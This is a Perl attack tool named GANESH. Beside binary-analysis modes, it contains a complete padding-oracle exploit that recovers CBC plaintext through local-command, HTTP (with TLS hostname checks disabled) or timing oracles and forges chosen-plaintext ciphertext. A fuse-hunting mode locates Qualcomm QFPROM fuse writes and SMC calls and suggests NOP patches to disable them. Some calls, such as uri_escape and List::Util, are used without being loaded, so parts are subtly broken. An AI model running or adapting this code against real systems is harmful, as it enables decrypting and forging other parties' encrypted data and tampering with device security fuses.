#!/usr/bin/env perl
# GANESH v3.0 – Copyleft Binary Analysis Engine
# Modes: parse, fuse_hunt, reg_resolve, analysis/funcs/xref/cfg, diff, oracle, http, timing
# SPDX-License-Identifier: GPL-3.0-or-later
use strict;
use warnings;
use MIME::Base64 qw(encode_base64 decode_base64);
use Getopt::Long;
use POSIX qw(floor);

# Optional modules (loaded lazily)
my $have_lwp = eval { require LWP::UserAgent; require HTTP::Request; 1 };
my $have_threads = eval { require threads; require Thread::Queue; 1 };

my %opt = (mode => '', bs => 16, workers => 4, timing_threshold => 50,
           retries => 3, delay => 0.1);

GetOptions(\%opt,
    'mode=s', 'lift=s', 'ciphertext=s', 'target=s', 'out=s', 'bs=i',
    'url=s', 'method=s', 'param=s', 'header=s@',
    'workers=i', 'timing_threshold=i', 'retries=i', 'delay=f',
    'qfprom_base=s', 'qfprom_size=s',
    'original=s', 'modified=s', 'insn_size=i',
) or die "Usage: $0 --mode parse|fuse_hunt|reg_resolve|analysis|funcs|xref|cfg|diff|oracle|http|timing [opts]\n";

# ── Parse Mode ──────────────────────────────────────────────────────────────
if ($opt{mode} eq 'parse') {
    my $lift = $opt{lift} or die "--lift required\n";
    -f $lift or die "lift file not found: $lift\n";
    open my $fh, '<', $lift or die;
    my $blob = '';
    while (<$fh>) {
        if (/CAP_ID:\s*(\d+).*BOUND:\s*(\d+)/) {
            my ($id, $bound) = ($1, $2);
            my $op = /LOAD/ ? 1 : /STORE/ ? 2 : /BRANCH/ ? 3 : /CALL/ ? 4 : 0;
            $blob .= pack('C Q> Q>', $op, $id, $bound);
        }
    }
    close $fh;
    $blob ||= pack('C Q> Q>', 0, 0xDEADBEEF, 128);
    my $b64 = encode_base64($blob, '');
    if ($opt{out}) {
        open my $o, '>', $opt{out} or die;
        print $o $b64;
        close $o;
    } else { print "$b64\n" }
    print "[GANESH] parse complete\n";
    exit 0;
}

# ── Fuse Hunt Mode ───────────────────────────────────────────────────────────
# Scans SLEDGE v3.0 lifted IR for QFPROM write patterns, SMC calls,
# and system register access that indicate fuse-burning sequences.
# Input: --lift <sledge_output.ir>
# Output: annotated report of fuse-write candidates with addresses
if ($opt{mode} eq 'fuse_hunt') {
    my $lift = $opt{lift} or die "--lift <ir_file> required for fuse_hunt\n";
    -f $lift or die "IR file not found: $lift\n";

    # QFPROM address range (Qualcomm SM8650 / Snapdragon 8 Gen 3)
    my $QFPROM_BASE = 0x00780000;
    my $QFPROM_END  = 0x00790000;

    my @smc_sites;      # SMC instruction locations
    my @mmio_writes;     # Stores that could target QFPROM
    my @sysreg_writes;   # MSR instructions (security state changes)
    my @mov_imm_chain;   # MOV/MOVK sequences building QFPROM addresses
    my @barriers;        # DSB/DMB near fuse writes (required for MMIO)
    my @all_stores;      # All store instructions
    my $arch = 'unknown';

    open my $fh, '<', $lift or die "Cannot open $lift: $!\n";
    while (<$fh>) {
        chomp;
        # Detect architecture header
        if (/^SLEDGE_V3\(ARCH:\s*(\w+)/) { $arch = $1; next }

        # SMC calls — EL3 secure monitor traps
        if (/OP:SMC.*addr=\s*(\d+).*imm=\s*(\d+)/) {
            push @smc_sites, { addr => $1, imm => $2, line => $. };
        }

        # System register writes (MSR) — security config changes
        if (/OP:SYSREG.*addr=\s*(\d+).*op=\s*MSR\s*,reg=\s*(\S+)/) {
            push @sysreg_writes, { addr => $1, reg => $2, line => $. };
        }

        # MMIO writes with QFPROM flag
        if (/OP:MMIO_WRITE.*addr=\s*(\d+).*mmio=\s*(\d+).*QFPROM:\s*TRUE/i) {
            push @mmio_writes, { addr => $1, mmio => $2, line => $. };
        }

        # Store instructions (candidates for QFPROM MMIO)
        if (/OP:STORE.*addr=\s*(\d+).*CAP:\s*(\d+)/) {
            push @all_stores, { addr => $1, cap => $2, line => $. };
        }

        # MOV immediate — track address construction
        if (/OP:MOV_IMM.*addr=\s*(\d+).*dest=\s*(\S+).*val=\s*(\d+).*shift=\s*(\d+)/) {
            my ($addr, $dest, $val, $shift) = ($1, $2, $3, $4);
            my $resolved = $val << $shift;
            push @mov_imm_chain, {
                addr => $addr, dest => $dest,
                val => $val, shift => $shift,
                resolved => $resolved, line => $.
            };
        }

        # Barriers near potential MMIO writes
        if (/OP:BARRIER.*addr=\s*(\d+).*kind=\s*(\S+)/) {
            push @barriers, { addr => $1, kind => $2, line => $. };
        }
    }
    close $fh;

    # ── Analysis: identify QFPROM address construction ────────────────────
    my @qfprom_candidates;
    for my $mov (@mov_imm_chain) {
        my $r = $mov->{resolved};
        if ($r >= $QFPROM_BASE && $r < $QFPROM_END) {
            push @qfprom_candidates, $mov;
        }
        # Also check partial address construction (MOVZ+MOVK patterns)
        # If shift=16 and val matches upper 16 bits of QFPROM base
        if ($mov->{shift} == 16 && $mov->{val} == ($QFPROM_BASE >> 16)) {
            push @qfprom_candidates, $mov;
        }
        if ($mov->{shift} == 0 && $mov->{val} == ($QFPROM_BASE & 0xFFFF)) {
            push @qfprom_candidates, $mov;
        }
    }

    # ── Report ────────────────────────────────────────────────────────────
    my $out_path = $opt{out} // '/dev/stdout';
    open my $ofh, '>', $out_path or die "Cannot write $out_path: $!\n";

    print $ofh "=" x 70, "\n";
    print $ofh "GANESH v3.0 — FUSE HUNT REPORT\n";
    print $ofh "Architecture: $arch\n";
    print $ofh "Input: $lift\n";
    print $ofh "QFPROM range: 0x", sprintf("%08X", $QFPROM_BASE),
               " - 0x", sprintf("%08X", $QFPROM_END), "\n";
    print $ofh "=" x 70, "\n\n";

    # SMC sites
    print $ofh "--- SMC CALLS (Secure Monitor) ---\n";
    if (@smc_sites) {
        for my $s (@smc_sites) {
            printf $ofh "  [line %d] addr=0x%08X imm=%d\n",
                $s->{line}, $s->{addr}, $s->{imm};
        }
    } else { print $ofh "  (none found)\n" }

    # QFPROM address construction
    print $ofh "\n--- QFPROM ADDRESS CONSTRUCTION ---\n";
    if (@qfprom_candidates) {
        for my $q (@qfprom_candidates) {
            printf $ofh "  [line %d] addr=0x%08X %s = 0x%04X << %d => 0x%08X\n",
                $q->{line}, $q->{addr}, $q->{dest},
                $q->{val}, $q->{shift}, $q->{resolved};
        }
    } else { print $ofh "  (none found — QFPROM base may differ on this SoC)\n" }

    # Direct MMIO writes to QFPROM
    print $ofh "\n--- QFPROM MMIO WRITES ---\n";
    if (@mmio_writes) {
        for my $m (@mmio_writes) {
            printf $ofh "  *** FUSE WRITE *** [line %d] addr=0x%08X -> mmio=0x%08X\n",
                $m->{line}, $m->{addr}, $m->{mmio};
        }
    } else { print $ofh "  (none detected — may require MMIO resolution pass)\n" }

    # System register writes
    print $ofh "\n--- SYSTEM REGISTER WRITES (MSR) ---\n";
    if (@sysreg_writes) {
        for my $s (@sysreg_writes) {
            printf $ofh "  [line %d] addr=0x%08X MSR -> %s\n",
                $s->{line}, $s->{addr}, $s->{reg};
        }
    } else { print $ofh "  (none found)\n" }

    # Barriers (DSB/DMB near fuse writes — mandatory for MMIO correctness)
    print $ofh "\n--- MEMORY BARRIERS (MMIO ordering) ---\n";
    printf $ofh "  %d barriers found\n", scalar @barriers;

    # Summary statistics
    print $ofh "\n--- SUMMARY ---\n";
    printf $ofh "  Total instructions analyzed: %d stores, %d MOV/MOVK\n",
        scalar @all_stores, scalar @mov_imm_chain;
    printf $ofh "  SMC calls: %d\n", scalar @smc_sites;
    printf $ofh "  QFPROM address candidates: %d\n", scalar @qfprom_candidates;
    printf $ofh "  Direct QFPROM MMIO writes: %d\n", scalar @mmio_writes;
    printf $ofh "  System register writes: %d\n", scalar @sysreg_writes;

    # Tactical advice
    print $ofh "\n--- TACTICAL ---\n";
    if (@qfprom_candidates && @smc_sites) {
        print $ofh "  PATTERN MATCH: QFPROM address construction + SMC calls detected.\n";
        print $ofh "  This binary likely contains fuse-burning logic.\n";
        print $ofh "  NOP candidates (ARM64 NOP = 0xD503201F):\n";
        for my $q (@qfprom_candidates) {
            printf $ofh "    - Patch addr 0x%08X (QFPROM addr load)\n", $q->{addr};
        }
        for my $s (@smc_sites) {
            printf $ofh "    - Patch addr 0x%08X (SMC #%d)\n", $s->{addr}, $s->{imm};
        }
    } elsif (@smc_sites) {
        print $ofh "  SMC calls found but no QFPROM address construction detected.\n";
        print $ofh "  Fuse writes may use indirect addressing or different SoC base.\n";
        print $ofh "  Try: --qfprom_base=0xNNNNNNNN to override the search range.\n";
    } else {
        print $ofh "  No SMC or QFPROM patterns found.\n";
        print $ofh "  This binary may not contain fuse-burning logic,\n";
        print $ofh "  or the fuse write uses a different mechanism.\n";
    }

    close $ofh;
    print "[GANESH] fuse_hunt complete -> $out_path\n";
    exit 0;
}

# ── Reg Resolve Mode ─────────────────────────────────────────────────────────
# Composes MOVZ+MOVK sequences into resolved 64-bit addresses
# Detects QFPROM address construction across register lifetimes
if ($opt{mode} eq 'reg_resolve') {
    my $lift = $opt{lift} or die "--lift required\n";
    my $qbase = hex($opt{qfprom_base} // '780000');
    my $qsize = hex($opt{qfprom_size} // '10000');
    open my $fh, '<', $lift or die;
    my $out_path = $opt{out} // '/dev/stdout';
    open my $ofh, '>', $out_path or die;

    my (%regs, @resolved, @qhits);
    while (<$fh>) {
        if (/OP:MOV_IMM.*addr=\s*(\d+).*dest=\s*(\S+).*val=\s*(\d+).*shift=\s*(\d+)/) {
            my ($addr, $d, $v, $s) = ($1, $2, $3, $4); $d =~ s/\s+//g;
            if ($s == 0 && !exists $regs{$d}) {
                $regs{$d} = { val => $v, chain => [{v=>$v,s=>0,a=>$addr}] };
            } else {
                $regs{$d} //= { val => 0, chain => [] };
                $regs{$d}{val} |= ($v << $s);
                push @{$regs{$d}{chain}}, {v=>$v, s=>$s, a=>$addr};
                my $r = $regs{$d}{val};
                push @resolved, { reg=>$d, val=>$r, addr=>$addr, chain=>[@{$regs{$d}{chain}}] };
                push @qhits, { reg=>$d, val=>$r, addr=>$addr, chain=>[@{$regs{$d}{chain}}] }
                    if $r >= $qbase && $r < $qbase + $qsize;
            }
        }
        %regs = () if /OP:RET/;
    }
    close $fh;

    printf $ofh "GANESH_REG_RESOLVE(qfprom=0x%08X-0x%08X)\n", $qbase, $qbase+$qsize;
    for my $r (sort { $a->{addr} <=> $b->{addr} } @resolved) {
        printf $ofh "RESOLVED(addr=0x%08X,%s=0x%08X,steps=%d)\n",
            $r->{addr}, $r->{reg}, $r->{val}, scalar @{$r->{chain}};
    }
    if (@qhits) {
        print $ofh "\n*** QFPROM HITS ***\n";
        for my $q (@qhits) {
            printf $ofh "QFPROM_ADDR(%s=0x%08X,constructed_at=0x%08X)\n",
                $q->{reg}, $q->{val}, $q->{addr};
            printf $ofh "  MOVZ/K(0x%04X<<%d \@0x%X)\n", $_->{v},$_->{s},$_->{a} for @{$q->{chain}};
        }
    }
    printf $ofh "SUMMARY(resolved=%d,qfprom_hits=%d)\n", scalar @resolved, scalar @qhits;
    close $ofh; print "[GANESH] reg_resolve complete -> $out_path\n"; exit 0;
}

# ── Analysis Mode (funcs + xref + cfg) ───────────────────────────────────────
# Unified structural analysis: function detection, cross-references, CFG
if ($opt{mode} eq 'analysis' || $opt{mode} eq 'funcs' ||
    $opt{mode} eq 'xref' || $opt{mode} eq 'cfg') {
    my $lift = $opt{lift} or die "--lift required\n";
    open my $fh, '<', $lift or die;
    my $out_path = $opt{out} // '/dev/stdout';
    open my $ofh, '>', $out_path or die;

    my (@nodes, %call_tgt, %branch_tgt, %call_site, @rets, @smcs, $arch);
    while (<$fh>) {
        chomp;
        if (/^SLEDGE_V3.*ARCH:\s*(\w+)/) { $arch = $1; next }
        next unless /^PROOF\(/;
        my %n; $n{line} = $.;
        $n{op} = $1 if /OP:(\w+)/;
        $n{addr} = $1 if /addr=\s*(\d+)/;
        $n{target} = $1 if /TARGET:\s*(\d+)/;
        $n{imm} = $1 if /imm=\s*(\d+)/;
        push @nodes, \%n;
        $call_tgt{$n{target}}++ and ($call_site{$n{addr}} = $n{target})
            if ($n{op}//'') eq 'CALL' && defined $n{target};
        $branch_tgt{$n{target}}++
            if ($n{op}//'') eq 'BRANCH' && defined $n{target};
        push @rets, $n{addr} if ($n{op}//'') eq 'RET';
        push @smcs, $n{addr} if ($n{op}//'') eq 'SMC';
    }
    close $fh;

    printf $ofh "GANESH_ANALYSIS(arch=%s,nodes=%d)\n", $arch//'?', scalar @nodes;

    # Functions
    if ($opt{mode} ne 'xref' && $opt{mode} ne 'cfg') {
        print $ofh "\n=== FUNCTIONS ===\n";
        my @fa = sort { $a <=> $b } keys %call_tgt;
        unshift @fa, $nodes[0]{addr} if @nodes && !$call_tgt{$nodes[0]{addr}//0};
        for my $i (0..$#fa) {
            my $s = $fa[$i];
            my $e = ($i<$#fa) ? $fa[$i+1]-1 : ($nodes[-1]{addr}//0);
            my $smc_n = grep { $_ >= $s && $_ <= $e } @smcs;
            my $ret_n = grep { $_ >= $s && $_ <= $e } @rets;
            printf $ofh "FUNC(start=0x%08X,size=%d,callers=%d,rets=%d",
                $s, $e-$s, $call_tgt{$s}//0, $ret_n;
            printf $ofh ",smc=%d,FUSE_CANDIDATE", $smc_n if $smc_n;
            print $ofh ")\n";
        }
        printf $ofh "FUNC_TOTAL(%d)\n", scalar @fa;
    }

    # Cross-references
    if ($opt{mode} ne 'funcs' && $opt{mode} ne 'cfg') {
        print $ofh "\n=== XREF ===\n";
        for my $s (sort { $a <=> $b } keys %call_site) {
            printf $ofh "XREF_CALL(from=0x%08X,to=0x%08X)\n", $s, $call_site{$s};
        }
        my @hot = sort { ($call_tgt{$b}//0)+($branch_tgt{$b}//0) <=>
                         ($call_tgt{$a}//0)+($branch_tgt{$a}//0) }
                  keys %{{%call_tgt,%branch_tgt}};
        print $ofh "HOT_TARGETS:\n";
        for my $t (@hot[0..($#hot<9?$#hot:9)]) {
            printf $ofh "  HOT(addr=0x%08X,calls=%d,branches=%d)\n",
                $t, $call_tgt{$t}//0, $branch_tgt{$t}//0;
        }
    }

    # CFG
    if ($opt{mode} ne 'funcs' && $opt{mode} ne 'xref') {
        print $ofh "\n=== CFG ===\n";
        my %leaders;
        $leaders{$nodes[0]{addr}} = 1 if @nodes;
        for my $n (@nodes) {
            if (($n->{op}//'') =~ /^(BRANCH|CALL)$/ && defined $n->{target}) {
                $leaders{$n->{target}} = 1;
                $leaders{$n->{addr} + 4} = 1;
            }
            $leaders{$n->{addr} + 4} = 1 if ($n->{op}//'') eq 'RET';
        }
        my @bs = sort { $a <=> $b } keys %leaders;
        printf $ofh "BASIC_BLOCKS(%d)\n", scalar @bs;
        for my $i (0..$#bs) {
            my $s = $bs[$i];
            my $e = ($i<$#bs) ? $bs[$i+1] : ($nodes[-1]{addr}//0)+4;
            printf $ofh "BB(start=0x%08X,size=%d", $s, ($e-$s)/4;
            for my $n (@nodes) {
                next unless defined $n->{addr} && $n->{addr}>=$s && $n->{addr}<$e;
                printf $ofh ",->0x%08X", $n->{target}
                    if ($n->{op}//'') eq 'BRANCH' && defined $n->{target};
                printf $ofh ",=>0x%08X", $n->{target}
                    if ($n->{op}//'') eq 'CALL' && defined $n->{target};
                printf $ofh ",->[ret]" if ($n->{op}//'') eq 'RET';
            }
            print $ofh ")\n";
        }
    }

    printf $ofh "\nANALYSIS_SUMMARY(functions=%d,call_sites=%d,branch_targets=%d," .
        "rets=%d,smcs=%d)\n", scalar keys %call_tgt, scalar keys %call_site,
        scalar keys %branch_tgt, scalar @rets, scalar @smcs;
    close $ofh; print "[GANESH] analysis complete -> $out_path\n"; exit 0;
}

# ── Diff Mode ────────────────────────────────────────────────────────────────
# Compares two binaries byte-by-byte (or two IR files line-by-line)
if ($opt{mode} eq 'diff') {
    my $f1 = $opt{original} // $opt{lift} or die "--original and --modified required\n";
    my $f2 = $opt{modified} or die "--modified required\n";
    my $is = $opt{insn_size} // 4;
    my $out_path = $opt{out} // '/dev/stdout';
    open my $ofh, '>', $out_path or die;

    open my $fh1, '<:raw', $f1 or die;
    open my $fh2, '<:raw', $f2 or die;
    my ($d1, $d2); { local $/; $d1 = <$fh1>; $d2 = <$fh2>; }
    close $fh1; close $fh2;

    my $min = length($d1) < length($d2) ? length($d1) : length($d2);
    printf $ofh "GANESH_DIFF(file1=%s[%d],file2=%s[%d])\n", $f1, length($d1), $f2, length($d2);

    my @diffs;
    for (my $i = 0; $i + $is <= $min; $i += $is) {
        my $a = substr($d1, $i, $is);
        my $b = substr($d2, $i, $is);
        if ($a ne $b) {
            push @diffs, { off => $i, orig => unpack('H*',$a), mod => unpack('H*',$b) };
            printf $ofh "DELTA(off=0x%08X,was=%s,now=%s", $i, uc unpack('H*',$a), uc unpack('H*',$b);
            printf $ofh ",NOP'd" if uc(unpack('H*',$b)) eq '1F2003D5';
            print $ofh ")\n";
        }
    }
    printf $ofh "DIFF_SUMMARY(changed=%d,total=%d)\n", scalar @diffs, $min/$is;
    close $ofh; print "[GANESH] diff complete -> $out_path\n"; exit 0;
}

# ── Shared oracle infrastructure ─────────────────────────────────────────────
sub read_bin {
    local $/;
    open my $f, '<:raw', $_[0] or die "read_bin: $!";
    return <$f>;
}

sub with_retry {
    my ($fn, $retries) = @_;
    for my $attempt (1 .. $retries) {
        my $r = eval { $fn->() };
        return $r unless $@;
        warn "[GANESH] retry $attempt/$retries: $@";
        select undef, undef, undef, $opt{delay} * $attempt;
    }
    die "all retries exhausted\n";
}

# Local-command oracle
sub query_cmd {
    my ($payload_bytes, $cmd) = @_;
    my $tmp = "/tmp/ganesh_$$\_" . int(rand 1e6) . ".bin";
    open my $f, '>:raw', $tmp or die;
    print $f $payload_bytes;
    close $f;
    my $out = `$cmd $tmp 2>&1`;
    unlink $tmp;
    return $out !~ /BadPaddingException|IllegalBlockSize|padding/i;
}

# HTTP oracle (for web targets)
sub query_http {
    my ($payload_bytes) = @_;
    die "LWP::UserAgent not available; install libwww-perl\n" unless $have_lwp;
    my $b64 = encode_base64($payload_bytes, '');
    my $ua  = LWP::UserAgent->new(timeout => 10, ssl_opts => {verify_hostname => 0});
    my $url = $opt{url} or die "--url required for http mode\n";
    my $method = uc($opt{method} // 'POST');
    my $req;
    if ($method eq 'GET') {
        (my $u = $url) =~ s/PAYLOAD/$b64/g;
        $req = HTTP::Request->new(GET => $u);
    } else {
        my $param = $opt{param} // 'data';
        $req = HTTP::Request->new(POST => $url,
                                  [], "$param=" . uri_escape($b64));
    }
    for my $h (@{$opt{header} // []}) {
        my ($k, $v) = split /:\s*/, $h, 2;
        $req->header($k => $v);
    }
    my $resp = with_retry(sub { $ua->request($req) }, $opt{retries});
    # Padding error → 500 or body contains error indicator
    return $resp->code != 500 &&
           $resp->decoded_content !~ /padding|BadPadding|InvalidBlock/i;
}

# Timing oracle (statistical; for targets with no explicit error)
{
    my @baseline;
    sub query_timing {
        my ($payload_bytes, $cmd_or_url) = @_;
        unless (@baseline) {
            # Warm up with 20 valid-looking requests
            for (1..20) {
                my $t0 = time_us();
                eval { query_cmd($payload_bytes, $cmd_or_url) };
                push @baseline, time_us() - $t0;
            }
        }
        my $mean = (List::Util::sum(@baseline)) / @baseline;
        my $t0   = time_us();
        eval { query_cmd($payload_bytes, $cmd_or_url) };
        my $dt   = time_us() - $t0;
        # If significantly slower → padding error (target processes further on valid pad)
        return $dt < $mean * (1 + $opt{timing_threshold} / 100);
    }
}

sub time_us {
    require Time::HiRes;
    return Time::HiRes::time() * 1_000_000;
}

# ── Core Padding Oracle Recovery ──────────────────────────────────────────
sub recover_block {
    my ($prev_block, $cipher_block, $query_fn, $bs) = @_;
    my @inter = (0) x $bs;
    my @plain  = (0) x $bs;
    my @prev   = unpack('C*', $prev_block);
    my @ciph   = unpack('C*', $cipher_block);

    for my $pad (1 .. $bs) {
        my $idx = $bs - $pad;
        my $found = 0;
        GUESS: for my $g (0 .. 255) {
            my @mut = (0) x $bs;
            for my $j (1 .. $pad - 1) {
                $mut[$bs - $j] = $inter[$bs - $j] ^ $pad;
            }
            $mut[$idx] = $g ^ $pad;
            my $payload = pack('C*', @mut) . pack('C*', @ciph);
            next unless $query_fn->($payload);
            if ($pad == 1 && $idx > 0) {
                my @t = @mut; $t[$idx - 1] ^= 0xFF;
                next GUESS unless $query_fn->(pack('C*', @t) . pack('C*', @ciph));
            }
            $inter[$idx] = $g;
            $plain[$idx]  = $g ^ $prev[$idx];
            printf STDERR "[GANESH] byte idx=%d val=%02x\n", $idx, $plain[$idx];
            $found = 1; last GUESS;
        }
        warn "[GANESH] byte $idx: not found\n" unless $found;
    }
    return pack('C*', @plain);
}

# Parallel recovery (fork workers per byte position)
sub recover_block_parallel {
    my ($prev_block, $cipher_block, $query_fn, $bs, $workers) = @_;
    my @inter = (0) x $bs;
    my @plain  = (0) x $bs;
    my @prev   = unpack('C*', $prev_block);
    my @ciph   = unpack('C*', $cipher_block);

    # Still sequential per pad round (inter-byte dependency), but guess space
    # is parallelised across fork workers when $workers > 1
    for my $pad (1 .. $bs) {
        my $idx = $bs - $pad;
        my $chunk = int(256 / $workers);
        my @pipes;
        for my $w (0 .. $workers - 1) {
            my ($rdr, $wtr);
            pipe($rdr, $wtr) or die "pipe: $!";
            my $pid = fork // die "fork: $!";
            if ($pid == 0) {
                close $rdr;
                my $start = $w * $chunk;
                my $end   = ($w == $workers - 1) ? 255 : $start + $chunk - 1;
                GUESS: for my $g ($start .. $end) {
                    my @mut = (0) x $bs;
                    for my $j (1 .. $pad - 1) {
                        $mut[$bs - $j] = $inter[$bs - $j] ^ $pad;
                    }
                    $mut[$idx] = $g ^ $pad;
                    my $payload = pack('C*', @mut) . pack('C*', @ciph);
                    next unless $query_fn->($payload);
                    if ($pad == 1 && $idx > 0) {
                        my @t = @mut; $t[$idx - 1] ^= 0xFF;
                        next GUESS unless $query_fn->(pack('C*', @t) . pack('C*', @ciph));
                    }
                    print $wtr "$g\n";
                    last;
                }
                close $wtr;
                exit 0;
            }
            close $wtr;
            push @pipes, { rdr => $rdr, pid => $pid };
        }
        my $found_g = -1;
        for my $p (@pipes) {
            my $line = readline($p->{rdr});
            close $p->{rdr};
            waitpid($p->{pid}, 0);
            $line = '' unless defined $line; chomp($line);
            $found_g = int($line) if $line =~ /^\d+$/ && $found_g == -1;
        }
        if ($found_g >= 0) {
            $inter[$idx] = $found_g;
            $plain[$idx]  = $found_g ^ $prev[$idx];
            printf STDERR "[GANESH] byte idx=%d val=%02x (parallel)\n", $idx, $plain[$idx];
        } else {
            warn "[GANESH] byte $idx: not found\n";
        }
    }
    return pack('C*', @plain);
}

# ── CBC-R: Reconstruct (forge ciphertext for chosen plaintext) ──────────────
sub cbc_reconstruct {
    my ($desired_plaintext, $query_fn, $bs) = @_;
    my $len = length($desired_plaintext);
    $len += $bs - ($len % $bs) if $len % $bs;  # pad to block boundary
    my @pt_blocks = unpack("(a$bs)*", $desired_plaintext);
    my $n = scalar @pt_blocks;

    # Work backwards from a random last ciphertext block
    my @ct;
    $ct[$n] = join('', map { chr(int rand 256) } 1..$bs);  # random last block

    for my $i (reverse 0 .. $n - 1) {
        # Recover intermediate bytes of ct[i+1] via oracle
        my @inter = (0) x $bs;
        my @ciph  = unpack('C*', $ct[$i+1]);
        for my $pad (1 .. $bs) {
            my $idx = $bs - $pad;
            GUESS: for my $g (0..255) {
                my @mut = (0) x $bs;
                for my $j (1 .. $pad-1) { $mut[$bs-$j] = $inter[$bs-$j] ^ $pad }
                $mut[$idx] = $g ^ $pad;
                my $payload = pack('C*', @mut) . pack('C*', @ciph);
                next unless $query_fn->($payload);
                if ($pad==1 && $idx>0) {
                    my @t=@mut; $t[$idx-1]^=0xFF;
                    next GUESS unless $query_fn->(pack('C*',@t).pack('C*',@ciph));
                }
                $inter[$idx]=$g; last GUESS;
            }
        }
        # ct[i][j] = inter[j] XOR pt[i][j]
        my @pt = unpack('C*', $pt_blocks[$i]);
        $ct[$i] = pack('C*', map { $inter[$_] ^ $pt[$_] } 0..$bs-1);
    }
    return join('', @ct);
}

# ── Mode dispatch ─────────────────────────────────────────────────────────────
my $query_fn;
if ($opt{mode} eq 'oracle') {
    my $cmd = $opt{target} or die "--target required\n";
    $query_fn = sub { query_cmd($_[0], $cmd) };
} elsif ($opt{mode} eq 'http') {
    $query_fn = sub { query_http($_[0]) };
} elsif ($opt{mode} eq 'timing') {
    my $cmd = $opt{target} or die "--target required\n";
    $query_fn = sub { query_timing($_[0], $cmd) };
} else {
    exit 0 if $opt{mode} eq 'parse';  # already handled
    die "Unknown mode: $opt{mode}\n";
}

my $ct_file = $opt{ciphertext} or die "--ciphertext required\n";
my $ct = read_bin($ct_file);
my $bs = $opt{bs};
my @blocks = unpack("(a$bs)*", $ct);
die "Need >= 2 blocks\n" unless @blocks >= 2;

my $workspace = $ENV{AVRS_WORKSPACE} // '/home/user/A51/avrs-cybernetic';
my $recover_fn = ($opt{workers} > 1 && $have_threads)
    ? sub { recover_block_parallel(@_, $bs, $opt{workers}) }
    : sub { recover_block(@_, $bs) };

my $recovered = '';
for my $i (1 .. $#blocks) {
    $recovered .= $recover_fn->($blocks[$i-1], $blocks[$i], $query_fn);
}

my $pad_len = ord(substr($recovered, -1)) & 0xFF;
$pad_len = 0 if $pad_len > $bs || $pad_len == 0;
my $plaintext = substr($recovered, 0, length($recovered) - $pad_len);

my $out = "$workspace/results/plaintext.bin";
open my $of, '>:raw', $out or die;
print $of $plaintext;
close $of;
printf "[GANESH] Recovered %d bytes -> %s\n", length($plaintext), $out;
